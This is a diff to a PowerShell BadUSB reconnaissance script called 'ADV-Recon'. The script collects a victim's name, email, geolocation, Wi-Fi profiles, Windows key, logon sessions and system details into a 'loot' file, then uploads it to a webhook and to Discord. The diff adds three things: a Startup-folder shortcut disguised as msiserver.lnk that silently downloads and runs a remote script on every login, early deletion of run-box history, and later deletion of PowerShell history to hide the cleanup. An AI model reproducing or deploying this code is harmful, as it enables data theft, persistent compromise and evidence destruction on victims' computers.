@@ -32,6 +32,10 @@
 
 ############################################################################################################################################################
 
+# Delete run box history first, incase user checks immediately
+
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
 # MAKE LOOT FOLDER, FILE, and ZIP 
 
 $FolderName = "$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm)"
@@ -370,7 +374,6 @@ $videocard=Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcess
 # OUTPUTS RESULTS TO LOOT FILE
 
 $output = @"
-
 ############################################################################################################################################################                      
 #                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
 # Title        : ADV-Recon         | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
@@ -389,149 +392,94 @@ $output = @"
 #  instagram.com/i_am_jakoby                                                                                 #  |  |  |  | ) ) |  |  | ((  |  |  |  |  |  |#              
 #  youtube.com/c/IamJakoby                                                                                   #  |  |  |  |( (  |  |  |  \\ |  |  |  |  |  |#
 ############################################################################################################################################################
-
-
 Full Name: $fullName
-
 Email: $email
-
 GeoLocation:
 Latitude:  $Lat 
 Longitude: $Lon
-
 ------------------------------------------------------------------------------------------------------------------------------
-
 Local Users:
 $luser
-
 ------------------------------------------------------------------------------------------------------------------------------
-
 UAC State:
 $UAC
-
 LSASS State:
 $lsass
-
 RDP State:
 $RDP
-
 ------------------------------------------------------------------------------------------------------------------------------
-
 Public IP: 
 $computerPubIP
-
 Local IPs:
 $localIP
-
 MAC:
 $MAC
-
 ------------------------------------------------------------------------------------------------------------------------------
-
 Computer Name:
 $computerName
-
 Model:
 $computerModel
-
 Manufacturer:
 $computerManufacturer
-
 UUID:
 $computerUUID
-
 BIOS:
 $computerBIOS
-
 OS:
 $computerOs
-
 CPU:
 $computerCpu
-
 Mainboard:
 $computerMainboard
-
 Ram Capacity:
 $computerRamCapacity
-
 Total installed Ram:
 $computerRam
-
 Video Card: 
 $videocard
-
 Windows Key:
 $computerWindowsKey
-
 ------------------------------------------------------------------------------------------------------------------------------
-
 Contents of Start Up Folder:
 $StartUp
-
 ------------------------------------------------------------------------------------------------------------------------------
-
 Scheduled Tasks:
 $ScheduledTasks
-
 ------------------------------------------------------------------------------------------------------------------------------
-
 Logon Sessions:
 $klist
-
 ------------------------------------------------------------------------------------------------------------------------------
-
 Recent Files:
 $RecentFiles
-
 ------------------------------------------------------------------------------------------------------------------------------
-
 Hard-Drives:
 $Hdds
-
 COM Devices:
 $COMDevices
-
 ------------------------------------------------------------------------------------------------------------------------------
-
 Network Adapters:
 $NetworkAdapters
-
 ------------------------------------------------------------------------------------------------------------------------------
-
 Nearby Wifi:
 $NearbyWifi
-
 Wifi Profiles: 
 $wifiProfiles
-
 ------------------------------------------------------------------------------------------------------------------------------
-
 Process:
 $process
-
 ------------------------------------------------------------------------------------------------------------------------------
-
 Listeners:
 $listener
-
 ------------------------------------------------------------------------------------------------------------------------------
-
 Services:
 $service
-
 ------------------------------------------------------------------------------------------------------------------------------
-
 Installed Software: 
 $software
-
 ------------------------------------------------------------------------------------------------------------------------------
-
 Drivers: 
 $drivers
-
 ------------------------------------------------------------------------------------------------------------------------------
-
 "@
 
 $output > $env:TEMP\$FolderName/computerData.txt
@@ -678,7 +626,18 @@ if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 
 if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -text $text}
 
+############################################################################################################################################################
  
+# Setup Persistence if possible
+if(![System.IO.File]::Exists($env:USERPROFILE + "Start Menu\Programs\Startup" + "\msiserver.lnk")){
+    $objShell = New-Object -COM WScript.Shell
+	$objShortCut = $objShell.CreateShortcut($env:USERPROFILE + "Start Menu\Programs\Startup\msiserver.lnk")
+	$target = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+	$args = "-w h -ep bypass -command `"`$dc='$dc';irm https://files.seall.dev/badusb/SeallDEV+jakoby-RECON.ps1 | iex`""
+	$objShortCut.TargetPath = $target
+	$objShortcut.Arguments = $args
+	$objShortCut.Save()
+}
 
 ############################################################################################################################################################
 
@@ -687,23 +646,19 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -text $text}
 	This is to clean up behind you and remove any evidence to prove you were there
 #>
 
-# Delete contents of Temp folder 
+# Delete loot files 
 
 rm $env:TEMP\$FolderName\* -r -Force -ErrorAction SilentlyContinue
 rmdir $env:TEMP\$FolderName -r -Force -ErrorAction SilentlyContinue
 rm $env:TEMP\$ZIP -r -Force -ErrorAction SilentlyContinue
 
-# Delete run box history
-
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-
-# Delete powershell history
-
-Remove-Item (Get-PSreadlineOption).HistorySavePath
-
 # Deletes contents of recycle bin
 
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+
+# Delete powershell history after all commands, to disguise all cleanup
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
 
 		
 ############################################################################################################################################################
